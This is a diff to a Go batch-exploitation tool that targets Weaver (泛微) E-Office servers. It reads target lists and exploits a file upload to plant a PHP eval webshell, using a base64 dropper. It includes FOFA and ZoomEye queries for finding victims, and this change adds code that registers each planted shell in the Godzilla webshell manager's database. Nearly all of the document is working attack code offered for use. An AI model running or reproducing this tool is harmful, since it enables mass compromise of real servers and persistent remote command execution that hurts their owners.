@@ -10,6 +10,7 @@ import (
 	"bufio"
 	"bytes"
 	"crypto/tls"
+	"database/sql"
 	"encoding/base64"
 	"flag"
 	"fmt"
@@ -25,6 +26,8 @@ import (
 	"time"
 
 	"github.com/fatih/color"
+	"github.com/google/uuid"
+	_ "github.com/mattn/go-sqlite3"
 )
 
 var (
@@ -33,6 +36,7 @@ var (
 	targetfile string
 	shellName  string
 	output     string
+	Godzilla   bool
 	//verifyStr     string
 	WarnOutput    *color.Color = color.New(color.FgRed, color.Bold)
 	SuccessOutput *color.Color = color.New(color.FgGreen, color.Bold)
@@ -43,13 +47,14 @@ func init() {
 	flag.StringVar(&targetfile, "tf", "", "批量测试目标文件")
 	flag.StringVar(&uploadfile, "uf", "", "需要上传的文件,默认将写入一句话webshell")
 	flag.StringVar(&output, "o", "results.txt", "将结果写到指定的文件中")
+	flag.BoolVar(&Godzilla, "g", false, "将godzilla的webshell写到data.db数据库中(default: false)")
 	flag.Parse()
 }
 
 func main() {
 	/*
-		app="泛微-EOffice"
-		app:"泛微协同办公标准产品EOffice"
+		fofa app="泛微-EOffice"
+		zoomeye app:"泛微协同办公标准产品EOffice"
 	*/
 	poc()
 }
@@ -79,6 +84,10 @@ func poc() {
 		if line, _, err = reader.ReadLine(); err != nil {
 			break
 		}
+		if strings.Trim(string(line), "\n") == "" {
+			continue
+		}
+
 		log.Printf("[%d]正在检测：%s", i, line)
 		uploadFile(string(line))
 		i += 1
@@ -86,7 +95,6 @@ func poc() {
 			err = nil
 		}
 	}
-
 }
 
 func uploadFile(t string) {
@@ -152,7 +160,6 @@ func createHttpClient() *http.Client {
 }
 
 func getPayload(fn string) string {
-
 	//verifyStr = getRandString(32) + "\n"
 	evilCode := "<?php @eval($_POST[\"cmd\"]);?>"
 	if uploadfile == "" {
@@ -175,7 +182,6 @@ func getPayload(fn string) string {
 
 	evilCode = base64.StdEncoding.EncodeToString([]byte(evilCode)) //写php代码时最好用base64，不然会出现一些问题。
 	return fmt.Sprintf("<?php $f=fopen(\"%s\", \"w\");$d='%s';fwrite($f, base64_decode($d));fclose($f);?>", fn, evilCode)
-
 }
 
 func getRandString(n int) string {
@@ -183,7 +189,6 @@ func getRandString(n int) string {
 	if n <= 0 {
 		n = 10
 	}
-
 	bytes := make([]byte, n)
 
 	r := rand.New(rand.NewSource(time.Now().UnixNano()))
@@ -221,6 +226,9 @@ func checkUploadFile(u string, sn string) {
 	defer resp.Body.Close()
 	//data, _ := ioutil.ReadAll(resp.Body)
 	if resp.StatusCode == http.StatusOK {
+		if Godzilla {
+			godzilla(webshell)
+		}
 		saveResults(output, webshell)
 		SuccessOutput.Println("利用成功, webshell地址：", webshell)
 		return
@@ -236,11 +244,11 @@ func saveResults(filename string, res string) {
 		}
 		defer f.Close()
 		n, err := io.WriteString(f, res+"\n")
-		if n > 0 && err != nil {
+		if err != nil {
+			log.Println("保存结果失败..", n)
+		} else {
 			log.Println("保存结果成功..")
-			return
 		}
-		log.Println("保存结果失败..")
 		return
 	}
 
@@ -252,4 +260,81 @@ func saveResults(filename string, res string) {
 	defer f.Close()
 	io.WriteString(f, res+"\n")
 
+}
+
+//将webshell写入数据库
+
+func godzilla(u string) {
+	//生成的是Godzilla马时将webshell url 写入数据库。
+	var (
+		Id          string
+		Url         string
+		Password    string
+		SecretKey   string
+		Payload     string
+		Cryption    string
+		Encoding    string
+		Headers     string
+		ReqLeft     string
+		ReqRight    string
+		ConnTimeout int
+		ReadTimeout int
+		ProxyType   string
+		ProxyHost   string
+		Remark      string
+		Note        string
+		CreateTime  string
+		UpdateTime  string
+		ProxyPort   string
+	)
+
+	db, err := sql.Open("sqlite3", "./data.db")
+
+	if err != nil {
+		log.Println("连接数据库失败。")
+		return
+	}
+	Url = u
+
+	stmt, _ := db.Prepare("INSERT INTO \"shell\"(\"id\", \"url\", \"password\", \"secretKey\", \"payload\", \"cryption\", \"encoding\", \"headers\", \"reqLeft\", \"reqRight\", \"connTimeout\", \"readTimeout\", \"proxyType\", \"proxyHost\", \"proxyPort\", \"remark\", \"note\", \"createTime\", \"updateTime\") VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)")
+
+	Id = uuid.New().String()
+	Password = "pass"
+	SecretKey = "key"
+	Payload = "PhpDynamicPayload"
+	Cryption = "PHP_XOR_BASE64"
+	Encoding = "UTF-8"
+	Headers = `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+	Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+	`
+	ReqLeft = ""
+	ReqRight = ""
+	ConnTimeout = 3000
+	ReadTimeout = 60000
+	ProxyType = "NO_PROXY"
+	ProxyHost = "127.0.0.1"
+	ProxyPort = "8888"
+	Remark = "备注"
+	Note = ""
+	CreateTime = time.Now().Format("2006-01-02 15:04:05")
+	UpdateTime = time.Now().Format("2006-01-02 15:04:05")
+
+	log.Println("写入数据库...")
+	res, err := stmt.Exec(Id, Url, Password, SecretKey, Payload, Cryption, Encoding, Headers, ReqLeft, ReqRight, ConnTimeout, ReadTimeout, ProxyType, ProxyHost, ProxyPort, Remark, Note, CreateTime, UpdateTime)
+	if err != nil {
+		log.Println("插入数据失败...", err.Error())
+		return
+	}
+
+	lidx, err := res.LastInsertId()
+
+	if err != nil {
+		log.Println("插入数据失败...", err.Error())
+		return
+	}
+
+	fmt.Println(lidx)
+
+	defer db.Close()
 }
